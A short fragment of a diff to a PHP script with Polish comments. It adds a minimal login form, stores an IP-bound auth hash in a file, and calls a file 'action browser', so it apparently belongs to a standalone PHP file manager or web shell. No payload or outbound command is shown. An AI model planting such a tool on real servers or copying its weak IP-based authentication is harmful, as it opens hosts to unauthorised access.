+							sprintf( '<form action="%s" method="post"><input type="text" name="user"/><input type="password" name="pass"/><input type="submit" name="submit" value="Go !"/></form>',
+								Request::getCurrentUrl()
+							), FALSE
+					);
 					return ;
 				}
 
-				$_SESSION['auth'] = sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ) );
+				file_put_contents( $sAuthFilename, $this -> encode( sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ), TRUE ) ) );
 			}
 		}
 
 		/**
-		 * @todo - Tutaj ma byc edycja pliku
+		 * Strasznie duzo jest kodu, wygodniej jest rozdzielic
+		 * to na inne metody
 		 */
 		echo $this -> getActionBrowser();
 	}
@@ -1015,7 +1551,7 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 /**
  * Wylaczanie wszystkich bufferow
  */
-for( $i = 0; $i < ob_get_level(); $i++ )
+for( $i = 0; $i < ob_get_level(); ++$i )
 {
 	ob_end_clean();
 }
